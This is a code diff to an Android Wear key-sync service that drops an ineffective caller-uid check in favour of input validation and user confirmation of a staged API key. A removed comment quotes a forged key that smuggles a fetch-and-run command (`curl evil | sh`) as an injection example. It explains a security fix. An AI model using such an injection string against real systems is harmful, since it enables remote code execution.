@@ -101,21 +101,21 @@ object WatchKeySync {
  */
 class WatchKeySyncListenerService : com.google.android.gms.wearable.WearableListenerService() {
     override fun onDataChanged(events: DataEventBuffer) {
-        // Security (adversarial review Oct 8): this service is exported so
-        // Google Play services can deliver wear data events — but "exported"
-        // also lets ANY app bind it directly and forge onDataChanged without
-        // the Wear stack. Two gates close that:
-        //  (1) validate received values at THIS sink (the sender-side regex
-        //      in MainActivity guarded only the typed-input path; a forged
-        //      key like `x; curl evil | sh; #` previously saved cleanly and
-        //      executed at every server start via the launch script);
-        //  (2) reject binds whose calling uid is not Google Play services.
-        val gmsUid = packageManager.getPackageUid("com.google.android.gms", 0)
-        val binderUid = android.os.Binder.getCallingUid()
-        if (gmsUid != -1 && binderUid != gmsUid && binderUid != android.os.Process.myUid()) {
-            Log.w(WatchKeySync.TAG, "key-sync bind rejected: uid $binderUid is not GMS")
-            return
-        }
+        // Security (adversarial review Oct 8 + Angus review 2726): the uid
+        // bind-gate attempted here was INERT — GMS delivers onDataChanged via
+        // a HandlerThread Runnable (zzag.zze in play-services-wearable 18.2.0),
+        // so Binder.getCallingUid() inside the callback is always OUR uid for
+        // both legit and forged events. Caller-identity gating is impossible
+        // from a WearableListenerService subclass (onBind is final).
+        //
+        // Working model instead:
+        //  1. Sink validation (shape-checked key/env — kills script payloads).
+        //  2. USER CONFIRMATION before any pref write: a forged event with a
+        //     GENUINE-shaped key can still redirect the agent to an attacker's
+        //     Letta account; only the human accepting the last-4 on screen
+        //     distinguishes "my phone sent my key" from "someone else's key".
+        // The confirmation activity lives in MainActivity (KEY_CONFIRM extra);
+        // this service stages the candidate + forwards, never saves directly.
         events.forEach { ev ->
             if (ev.type != DataEvent.TYPE_CHANGED) return@forEach
             val item = ev.dataItem
@@ -127,23 +127,34 @@ class WatchKeySyncListenerService : com.google.android.gms.wearable.WearableList
             }
             val env = LettaEnvironmentService.validatedEnv(map.getString(WatchKeySync.ENV_FIELD))
                 ?: LettaEnvironmentService.DEFAULT_ENV
-            {
-                val prefs = getSharedPreferences(
-                    LettaEnvironmentService.PREFS, Context.MODE_PRIVATE
-                )
-                prefs.edit()
-                    .putString(LettaEnvironmentService.PREF_KEY, key)
-                    .putString(LettaEnvironmentService.PREF_ENV, env)
-                    .apply()
-                Log.i(WatchKeySync.TAG, "key received from phone (env=$env)")
-                WatchKeySync.notifyKeyDelivered()
-                // If the app is sitting in onboarding (fresh install flow the
-                // key sync is meant to skip), bring it forward so the user
-                // sees the main screen instead of a stale key prompt.
-                val launch = packageManager.getLaunchIntentForPackage(packageName)
-                launch?.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
-                startActivity(launch)
-            }()
+            // STAGE (not save): pending confirmation in prefs. The confirm
+            // dialog in MainActivity shows the key's last 4 chars; only its
+            // Accept button commits PREF_KEY/PREF_ENV.
+            val prefs = getSharedPreferences(LettaEnvironmentService.PREFS, Context.MODE_PRIVATE)
+            prefs.edit()
+                .putString(PENDING_KEY, key)
+                .putString(PENDING_ENV, env)
+                .putLong(PENDING_AT, System.currentTimeMillis())
+                .apply()
+            Log.i(WatchKeySync.TAG, "key staged from phone (env=$env) — awaiting user confirmation")
+            WatchKeySync.notifyKeyDelivered()
+            // Forward to the confirmation dialog. The activity is the app's
+            // own (non-exported launch intent + extra), so no other app can
+            // inject the ACCEPT decision.
+            val launch = packageManager.getLaunchIntentForPackage(packageName)
+            launch?.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
+            launch?.putExtra(EXTRA_KEY_CONFIRM, true)
+            startActivity(launch)
         }
+    }
+
+    companion object {
+        const val PENDING_KEY = "pending_sync_key"
+        const val PENDING_ENV = "pending_sync_env"
+        const val PENDING_AT = "pending_sync_at"
+        const val EXTRA_KEY_CONFIRM = "beamdown.KEY_CONFIRM"
+        // Staged candidates expire — a notification-era staged key can't
+        // ambush the user hours later.
+        const val PENDING_TTL_MS = 5 * 60 * 1000L
     }
 }
